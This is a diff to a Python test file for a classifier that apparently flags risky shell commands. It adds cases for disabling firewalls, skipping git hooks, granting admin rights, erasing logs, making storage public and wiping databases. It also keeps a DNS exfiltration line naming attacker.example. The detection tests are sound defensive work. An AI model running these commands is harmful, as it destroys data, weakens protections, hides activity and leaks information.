@@ -48,13 +48,15 @@ def test_catastrophic(line):
     "git push --force origin main", "git push -f", "git push origin +main", "git push origin :old-branch",
     "git reset --hard HEAD~3", "git clean -fdx", "git branch -D feature", "git checkout -- .", "git stash drop",
     "git reflog expire --expire=now --all", "git reflog delete HEAD@{1}",
-    "history -c", "Clear-History", "wevtutil cl Security", "journalctl --vacuum-time=1s", "tmutil disable",
     "terraform destroy -auto-approve", "terraform apply -auto-approve", "tofu state rm aws_db.main",
+    "cdk destroy --force",
     "kubectl delete ns prod", "kubectl -n prod delete deployment api", "helm uninstall api",
     "aws rds delete-db-snapshot --db-snapshot-identifier x", "aws ec2 terminate-instances --instance-ids i-1",
     "aws s3 rm s3://bucket --recursive", "aws s3 rb s3://bucket --force", "gcloud compute instances delete vm-1",
     "az group delete -n rg", 'psql -c "DROP TABLE users"', 'mysql -e "TRUNCATE orders"',
+    "cqlsh -e 'DROP KEYSPACE prod'", "influx bucket delete -n prod", "etcdctl del --prefix /",
     'sqlite3 app.db "DELETE FROM users;"', "docker system prune -af", "docker volume rm data",
+    "podman system reset -f",
     "docker compose down -v", "npm publish", "gh repo delete me/repo --yes", "shutdown -h now", "crontab -r",
     "tmutil delete /Volumes/Backup/x", "tmutil delete -d /Volumes/Backup -t 2026-01-01-120000",
     f"{VSS} delete shadows /all /quiet", "reg delete HKLM\\Software\\X /f", "cipher /w:C",
@@ -130,6 +132,59 @@ def test_catastrophic(line):
     "heroku apps:destroy --app x --confirm x",
     "firebase firestore:delete --all-collections",
     "bq rm -r -f dataset",
+
+    # Commands that switch off protection (#26)
+    "ufw disable",
+    "iptables -F",
+    "iptables --flush",
+    "nft flush ruleset",
+    "netsh advfirewall set allprofiles state off",
+    "setenforce 0",
+    "Set-MpPreference -DisableRealtimeMonitoring $true",
+
+    # Skipping git hooks (#172)
+    "git commit --no-verify -m x",
+    "git push --no-verify",
+    "git config core.hooksPath /dev/null",
+    "git -c core.hooksPath=/dev/null commit -m x",
+
+    # Local accounts and admin rights, and new cloud access keys (#175)
+    "useradd -m -G sudo x",
+    "usermod -aG sudo x",
+    "passwd -d root",
+    "net user hacker P@ss /add",
+    "aws iam create-access-key --user-name x",
+    "sudo usermod -aG wheel x",
+    "adduser x sudo",
+    "gpasswd -a x sudo",
+    "net localgroup administrators x /add",
+
+    # Yanking or deprecating published packages (#169)
+    "cargo yank --version 1.0.0",
+    "gem yank mygem -v 1.0.0",
+    "npm deprecate mypkg 'use v2'",
+
+    # Erasing logs or history (#171)
+    "history -c",
+    "Clear-History",
+    "wevtutil cl Security",
+    "journalctl --vacuum-time=1s",
+    "tmutil disable",
+    "clhy",
+    "wevtutil clear-log Security",
+
+    # Making something public or granting admin (#29)
+    "aws s3api put-bucket-acl --bucket b --acl public-read",
+    "aws iam attach-user-policy --user-name bot --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+    "gsutil iam ch allUsers:objectViewer gs://bucket",
+    "chmod -R 777 .",
+    # Sync commands that delete (#23)
+    "rsync -a --delete src/ dst/",
+    "aws s3 sync . s3://bucket --delete",
+    "robocopy empty d:\\data /MIR",
+    "rclone sync ./empty remote:bucket",
+    "rclone purge remote:bucket",
+    "gsutil rsync -d . gs://bucket",
 ])
 def test_irreversible(line):
     assert kind(line) == "irreversible", commands.read(line).summary()
@@ -213,12 +268,63 @@ def test_no_false_alarm(line):
     "firebase firestore:indexes",
     "bq ls",
 
-    # Everyday inspection commands (#171)
+    # Checking firewall or security status (#26)
+    "ufw status",
+    "iptables -L",
+    "iptables -A INPUT -f -j DROP",     # lowercase -f matches fragments, it doesn't flush
+    "nft -f /etc/nftables.conf",        # loads rules from a file
+    "netsh advfirewall show allprofiles",
+    "getenforce",
+
+    # Everyday git work without --no-verify (#172)
+    "git commit -m fix",
+    "git push origin main",
+    "git push -n origin main",          # -n on push is --dry-run, not --no-verify
+    "git config user.name x",
+
+    # Looking at accounts and keys is not changing them (#175)
+    "id", "groups", "net user", "getent passwd x", "aws iam list-access-keys",
+    "usermod -aG audio x", "usermod --help",
+
+    # Startup inspection commands (#170)
+    "launchctl list",
+    "launchctl print system/com.example",
+    "systemctl status nginx",
+
+    # Secret listing is everyday work; reading secret values waits for an approver (#174)
+    "aws secretsmanager list-secrets",
+    "gcloud secrets list",
+    "az keyvault secret list --vault-name v",
+    "gh secret list",
+
+    # Everyday package searching and inspection (#169)
+    "cargo search serde",
+    "gem list",
+    "npm view mypkg",
+
+    # Normal history and log reading (#171)
     "history",
     "history | grep ssh",
     "journalctl -u nginx --since today",
     "wevtutil qe Security /c:5",
     "tmutil status",
+
+    # Safe permissions and read-only checks (#29)
+    "aws s3api get-bucket-acl --bucket b",
+    "aws iam list-attached-user-policies --user-name bot",
+    "chmod 644 file.txt",
+    # Sync commands without delete (#23)
+    "rsync -a src/ dst/",
+    "aws s3 sync . s3://bucket",
+    "robocopy src dst /E",
+    "rclone ls remote:bucket",
+    # External CLI inspection (#173)
+    'cqlsh -e "SELECT * FROM ks.t LIMIT 5"',
+    "influx bucket list",
+    "etcdctl get --prefix /app",
+    "podman ps",
+    "cdk diff",
+    "cdk synth",
 ])
 def test_everyday_work_is_not_held(line):
     assert kind(line) in ("other", "read_only"), commands.read(line).summary()
@@ -228,14 +334,33 @@ def test_summary_explains():
     assert "home folder" in commands.read("rm -rf ~/").summary()
     assert "whole drive" in commands.read("rmdir /s /q d:\\").summary()
     assert "remote" in commands.read("git push --force").summary()
-    assert "record of what ran" in commands.read("history -c").summary()
-    assert "Time Machine backups" in commands.read("tmutil disable").summary()
+    assert "launch agent" in commands.read("launchctl bootstrap gui/501 ~/Library/LaunchAgents/x.plist").summary()
     assert "disk" in commands.read("diskutil eraseDisk APFS X disk2").summary()
     assert "disk" in commands.read("diskutil zeroDisk disk2").summary()
     assert "repartition" in commands.read("diskutil partitionDisk disk2 1 GPT APFS X 100%").summary()
     assert "APFS" in commands.read("diskutil apfs deleteContainer disk2").summary()
     assert "backup" in commands.read("tmutil delete /Volumes/Backup/x").summary()
     assert "DNS name" in commands.read("nslookup $(whoami).attacker.example").summary()
+    assert "firewall" in commands.read("ufw disable").summary()
+    assert "skips the repository's own checks (git hooks)" in commands.read("git commit --no-verify -m x").summary()
+    assert "takes a published version away" in commands.read("cargo yank --version 1.0.0").summary()
+    assert "erases the record of what ran" in commands.read("history -c").summary()
+    assert "admin rights" in commands.read("usermod -aG sudo x").summary()
+    assert "access key" in commands.read("aws iam create-access-key --user-name x").summary()
+    assert "publicly readable" in commands.read("aws s3api put-bucket-acl --bucket b --acl public-read").summary()
+    assert "administrator access" in commands.read("aws iam attach-user-policy --user-name bot --policy-arn arn:aws:iam::aws:policy/AdministratorAccess").summary()
+    assert "accessible to the public" in commands.read("gsutil iam ch allUsers:objectViewer gs://bucket").summary()
+    assert "world-writable" in commands.read("chmod -R 777 .").summary()
+    assert "deletes whatever the destination has" in commands.read("rsync -a --delete src/ dst/").summary()
+    assert "DROP KEYSPACE" in commands.read("cqlsh -e 'DROP KEYSPACE prod'").summary()
+    assert "InfluxDB" in commands.read("influx bucket delete -n prod").summary()
+    assert "etcd" in commands.read("etcdctl del --prefix /").summary()
+    assert "containers" in commands.read("podman system reset -f").summary()
+    assert "infrastructure" in commands.read("cdk destroy --force").summary()
+
+
+def test_account_reasons_dont_repeat_the_password():
+    assert "P@ss" not in commands.read("net user hacker P@ss /add").summary()
 
 
 @pytest.mark.parametrize("line", ["diskutil list", "diskutil info disk2", "diskutil apfs list",
@@ -280,6 +405,17 @@ def test_command_of():
 def test_reading_secrets_is_never_just_looking(line):
     r = commands.read(line)
     assert r.kind != "read_only" and "secrets" in r.summary()
+
+
+@pytest.mark.parametrize("line", [
+    "aws secretsmanager get-secret-value --secret-id prod",
+    "gcloud secrets versions access latest --secret=db",
+    "az keyvault secret show --name x --vault-name v",
+])
+def test_cloud_secret_managers_read_as_secret(line):
+    r = commands.read(line)
+    assert r.kind == "secret"
+    assert "shows the value of a stored secret" in r.summary()
 
 
 @pytest.mark.parametrize("line", ["cat README.md", "cat src/tokenizer.py", "cat docs/environment.md", "ls src"])
@@ -445,6 +581,9 @@ def test_gh_irreversible_reasons_describe_the_operation(line, reason):
     "sudo systemctl --user enable example.service",
     "systemctl --host example.invalid enable example.service",
     "launchctl load -w ~/Library/LaunchAgents/com.example.plist",
+    "launchctl bootstrap gui/501 ~/Library/LaunchAgents/x.plist",
+    "launchctl enable gui/501/com.x",
+    "systemctl --user link /tmp/x.service",
     "crontab -",
     "crontab schedule.txt",
     "crontab -e",
